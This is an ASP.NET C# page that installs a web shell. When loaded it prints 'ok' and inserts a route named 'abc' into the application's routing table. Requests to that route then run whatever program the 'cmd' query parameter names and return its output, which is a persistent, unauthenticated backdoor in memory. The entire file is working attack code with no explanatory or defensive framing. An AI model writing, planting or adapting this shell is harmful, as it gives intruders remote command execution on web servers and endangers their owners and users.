<%@ Page Language="c#"%>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Web.Routing" %>

<script runat="server">
    public class CustomRouteHandler : IRouteHandler
    {
        public IHttpHandler GetHttpHandler(RequestContext requestContext)
        {
            return new CustomHttpHandler();
        }
    }
    public class CustomHttpHandler : IHttpHandler
    {
        public bool IsReusable
        {
            get
            {
                return false;
            }
        }
        public void ProcessRequest(HttpContext context)
        {
            String Payload = context.Request.QueryString["cmd"];
            if (Payload != null)
            {
                HttpResponseBase response = new HttpResponseWrapper(context.Response);
                Process p = new Process();
                p.StartInfo.FileName = Payload;
                Debug.WriteLine(p.StartInfo.FileName);
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();
                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                response.Write(System.Text.Encoding.Default.GetString(data));
            }
            /*context.Response.Redirect("https://www.dotnet-helpers.com", true);*/
        }
    }

    public class MyRoute : /*RouteBase,*/ IRouteHandler
    {

        public IHttpHandler GetHttpHandler(RequestContext requestContext)
        {
            HttpContext context = HttpContext.Current;
            String Payload = context.Request.QueryString["cmd"];
            if (Payload != null)
            {
                HttpResponseBase response = new HttpResponseWrapper(context.Response);
                Process p = new Process();
                p.StartInfo.FileName = Payload;
                Debug.WriteLine(p.StartInfo.FileName);
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();
                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                response.Write(System.Text.Encoding.Default.GetString(data));
            }
            return null;
        }
        /*public override RouteData GetRouteData(HttpContextBase httpContext)
        {
            return null;
        }

        public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
        {
            return null;
        }*/
    }
</script>

<%
    Response.Write("ok");
    RouteCollection routes = RouteTable.Routes;
    RouteTable.Routes.Insert(0, new Route("abc", new MyRoute()));
    //RouteTable.Routes.Insert(0, new Route("abc", new CustomRouteHandler()));

    //new Route("mr6{page}", new MyRoute());
    //routes.Insert(0, (RouteBase)new MyRoute());
    //new Route("mr6{page}", new MyRoute());
    //RouteTable.Routes.Add(new Route("abc", new CustomRouteHandler()));
    //RegisterRoutes(RouteTable.Routes);
%>